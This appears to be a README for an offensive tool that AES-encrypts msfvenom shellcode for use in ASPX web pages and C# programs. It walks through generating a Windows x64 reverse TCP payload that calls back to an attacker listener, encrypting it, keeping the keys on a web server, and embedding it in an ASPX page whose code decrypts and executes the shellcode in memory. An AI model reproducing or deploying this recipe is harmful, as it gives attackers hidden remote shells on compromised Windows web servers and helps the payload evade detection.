
### encrypt.py

Takes msfvenom csharp formatted shellcode and encrypts it for use in aspx pages and csharp programs.

Useage example:

1. Create shellcode with msfvenom
```bash
msfvenom -p windows/x64/custom/reverse_tcp lhost=tun0 lport=9999 -f csharp -o payloads/aspx.txt
```
2. Edit the output to remove all the text except the hex array so one ends up with a string like:
```bash
0xfc,0x48,0x83,...
...
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
```
3. Now encrypt the file payloads/aspx.txt
```bash
python3 encrypt.py --aes -i payloads/aspx.txt -k keys.txt -o payloads/new.txt
```
4. The AES encryption keys (hex) are stored in keys.txt. Add these keys to the program as is, keep them on a web server, etc...
```bash
❯ cat keys.txt
fb6625f20f40b8a7c17f663b775bc630eada2aa041cc1502b22a7294457fe09e
4ff1991d6594595a28f4fefe40a7c32f
```
5. Base64 encode `payloads/new.txt` and add it to `simple-aes-shellcode.aspx`
```asp

 if (aesKey.Length == 16 || aesKey.Length == 24 || aesKey.Length == 32)
        {
                // see Linux/Python/encrypt.py for encoding the shellcode
                byte[] encryptedBytes = Convert.FromBase64String("b64 encrypted shellcode here");
                modern = DecryptAES(encryptedBytes, aesKey, aesIV);
                if (modern == null)
                {
                    Response.Write("Decryption failed. modern is null.<br />");
                    return;
                }

                
                byte[] runner = HexStringToByteArray(Encoding.UTF8.GetString(modern));

                Executemodern(runner);

        }
```